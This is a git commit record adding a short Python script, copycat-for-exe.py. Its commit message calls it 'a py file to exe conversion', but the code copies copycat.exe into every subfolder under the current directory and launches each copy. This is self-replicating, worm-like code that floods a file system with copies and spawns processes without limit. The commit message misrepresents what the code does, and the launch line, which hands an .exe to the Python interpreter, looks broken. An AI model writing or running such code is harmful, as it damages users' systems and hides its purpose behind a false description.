f74b5faf7c1d30f366f2b72a7c4b5d905eb5437e
Mikolaj <mikolaj.sztorc@gmail.com>
2025-07-03 16:50:14 +0200

    added a py file to exe conversion

---
+++ copycat-for-exe.py
@@ -0,0 +1,22 @@
+import os
+import shutil
+import subprocess
+from sys import executable
+
+
+path = os.path.join(os.getcwd(), 'copycat.exe')
+
+
+for root, dirs, files in os.walk(os.getcwd()):
+	for subfolder in dirs:
+		try:
+			new_path = os.path.join(root, subfolder, 'copycat.exe')
+			if os.path.exists(new_path):
+				continue
+			shutil.copy(path,new_path)
+			print(f'Copied to {subfolder}')
+			subprocess.Popen([executable, new_path])
+			print(f'Successfully launched {new_path}')
+		except Exception as e:
+			print(f'Something went wrong: {e}')
+			input("Press Enter to continue...")
